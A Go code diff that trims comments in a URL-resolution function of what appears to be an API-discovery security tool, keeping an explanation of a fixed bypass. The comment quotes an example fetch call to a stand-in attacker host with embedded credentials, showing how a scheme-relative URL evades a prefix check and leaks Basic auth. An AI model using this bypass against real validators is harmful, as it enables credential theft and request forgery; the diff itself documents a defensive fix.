@@ -21,18 +21,9 @@ import (
 	"github.com/praetorian-inc/vespasian/pkg/crawl"
 )
 
-// toRequests converts a slice of ExtractedEndpoint into crawl.ObservedRequest
-// values. captureURL is the URL of the JS bundle that was analyzed; it is used
-// to resolve relative endpoint URLs to absolute form.
-//
-// Rules:
-//   - Source is taken directly from ExtractedEndpoint.SourceTag.
-//   - If BodyFields is non-empty, a synthetic JSON body is constructed as
-//     {"field": null, ...} with keys sorted lexicographically. This lets
-//     pkg/generate/rest.InferSchema produce a real object schema.
-//   - GET requests (and any method with zero BodyFields) receive a nil Body.
-//   - Content-Type header is added when ExtractedEndpoint.ContentType is set.
-//   - PageURL is propagated from ExtractedEndpoint.PageURL.
+// toRequests converts endpoints to requests, resolving relative URLs against
+// captureURL. BodyFields become a synthetic {"field": null} body so
+// rest.InferSchema produces a real object schema; no fields means a nil body.
 func toRequests(endpoints []ExtractedEndpoint, captureURL string) []crawl.ObservedRequest {
 	if len(endpoints) == 0 {
 		return nil
@@ -53,9 +44,7 @@ func toRequests(endpoints []ExtractedEndpoint, captureURL string) []crawl.Observ
 			PageURL: ep.PageURL,
 		}
 
-		// Resolve URL: absolute URLs are preserved; relative URLs are resolved
-		// against PageURL first (document-relative paths), falling back to the
-		// bundle URL when PageURL is empty or unparseable.
+		// PageURL first for document-relative paths, then the bundle URL.
 		base := bundleBase
 		if ep.PageURL != "" {
 			if pageBase, err := url.Parse(ep.PageURL); err == nil && pageBase.Host != "" {
@@ -64,44 +53,27 @@ func toRequests(endpoints []ExtractedEndpoint, captureURL string) []crawl.Observ
 		}
 		req.URL = resolveURL(ep.URL, base)
 
-		// SEC-BE-001 / SEC-BE-002: validate the RESOLVED URL — the value that
-		// actually reaches every sink — not the pre-resolution literal.
+		// Validate the RESOLVED URL, not the literal, and here rather than per-producer —
+		// this is the single point at which the final URL exists.
+		// A prefix test on the literal misses `fetch("//u:p@attacker.example/api/collect")`,
+		// which carries no scheme; base.ResolveReference then COPIES ref.User and inherits
+		// the base scheme, reconstituting the same userinfo as an absolute URL. Nothing
+		// downstream catches it: ssrf.ValidateURL inspects scheme and resolved IP but never
+		// u.User, and with probe.Config.AuthHeaders unset by every non-test caller net/http
+		// derives `Authorization: Basic <base64(userinfo)>` from req.URL.User on each probe.
+		// The host also persists to capture.json and into the spec's servers list.
 		//
-		// The previous fix gated ExtractedEndpoint.URL inside ExtractFromBundle and
-		// keyed off an http(s):// prefix test, which a scheme-relative literal walks
-		// straight past: `fetch("//u:p@attacker.example/api/collect")` has no scheme,
-		// so the gate skipped it, and then resolveURL's base.ResolveReference COPIES
-		// ref.User and inherits the base scheme — reconstituting the identical
-		// embedded userinfo as an absolute URL (scheme now present, host and
-		// credentials unchanged) after the check had already run.
-		// That candidate is floored to the default --confidence by classify Rule 7
-		// (it is an IsJSStaticSource with an API-indicator path), reaches
-		// OptionsProbe.probeURL where ssrf.ValidateURL inspects only scheme and
-		// resolved IP and never u.User, and — because probe.Config.AuthHeaders is
-		// populated by no non-test caller — makes net/http derive
-		// `Authorization: Basic <base64(userinfo)>` from req.URL.User on every probe.
-		// It also persisted to capture.json and put the attacker host in the spec's
-		// servers list.
-		//
-		// Gating here instead is both correct and simpler: this is the single point
-		// where the final URL exists, so there is exactly one check rather than one
-		// per producer (which also removes the double validation of concat
-		// endpoints, QUAL-001), and it cannot be bypassed by any spelling that
-		// resolution turns into an absolute URL.
-		//
-		// Only credential/scheme/host VALIDITY and the byte policy are enforced here.
-		// Same-origin remains a concat-only policy in extractConcatEndpoints — see
-		// the note there for why AST literals must keep cross-origin recall.
+		// Only credential/scheme/host validity and the byte policy are enforced here.
+		// Same-origin stays a concat-only policy in extractConcatEndpoints — see the note
+		// there for why AST literals must keep cross-origin recall.
 		if !specSafeURL(req.URL) {
 			continue
 		}
 
-		// Synthesize JSON body when BodyFields are present.
 		if len(ep.BodyFields) > 0 {
 			req.Body = synthBody(ep.BodyFields)
 		}
 
-		// Add Content-Type header when set.
 		if ep.ContentType != "" {
 			req.Headers = map[string]string{"Content-Type": ep.ContentType}
 		}
@@ -111,8 +83,7 @@ func toRequests(endpoints []ExtractedEndpoint, captureURL string) []crawl.Observ
 	return reqs
 }
 
-// resolveURL resolves rawURL relative to base. If rawURL is already absolute
-// or base is nil, rawURL is returned unchanged.
+// resolveURL returns rawURL unchanged when it is absolute or base is nil.
 func resolveURL(rawURL string, base *url.URL) string {
 	if base == nil {
 		return rawURL
@@ -127,16 +98,11 @@ func resolveURL(rawURL string, base *url.URL) string {
 	return base.ResolveReference(ref).String()
 }
 
-// synthBody marshals a map of field-name → nil into a JSON object byte slice.
-// Returns nil when fields is empty.
+// synthBody marshals field->nil into a JSON object; nil when fields is empty.
 //
-// Output is deterministic: encoding/json marshals map[string]interface{} with
-// keys in sorted order, which is guaranteed by the Go specification ("The map
-// keys are sorted and used as JSON object keys" —
-// https://pkg.go.dev/encoding/json#Marshal). This guarantee holds regardless
-// of the order of the input fields slice. In practice the current callers
-// (collectObjectKeys) already return fields in sorted order, but that is a
-// caller-side convention, not a correctness requirement here.
+// Deterministic whatever order fields arrives in: encoding/json sorts map keys
+// ("The map keys are sorted and used as JSON object keys" —
+// https://pkg.go.dev/encoding/json#Marshal), so callers need not pre-sort.
 func synthBody(fields []string) []byte {
 	if len(fields) == 0 {
 		return nil
